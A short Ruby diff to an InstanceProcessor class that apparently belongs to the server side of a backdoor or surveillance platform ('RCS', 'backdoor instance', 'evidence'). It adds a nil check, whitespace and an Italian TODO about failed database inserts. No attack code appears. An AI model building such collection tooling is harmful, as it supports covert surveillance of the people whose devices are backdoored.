@@ -67,7 +67,7 @@ class InstanceProcessor
     
     process = Proc.new do
       resume
-
+      
       until sleeping_too_much?
         until @evidences.empty?
           resume
@@ -76,8 +76,9 @@ class InstanceProcessor
           begin
             # get evidence and deserialize it
             data = RCS::EvidenceManager.get_evidence(evidence_id, @id)
+            raise "Empty evidence" if data.nil?
             evidences = RCS::Evidence.new(@key).deserialize(data)
-
+            
             evidences.each do |evidence|
               
               # store backdoor instance in evidence (used when storing into db)
@@ -96,6 +97,7 @@ class InstanceProcessor
                   done = false
                   until done
                     begin
+                      # TODO: gestire tutti i casi di inserimento fallito verso il DB
                       evidence.info[:backdoor_id] = RCS::EvidenceManager.instance_info(@id)["bid"]
                       RCS::DB::DB.evidence_store(evidence)
                       RCS::EvidenceManager.del_evidence(evidence_id, @id)
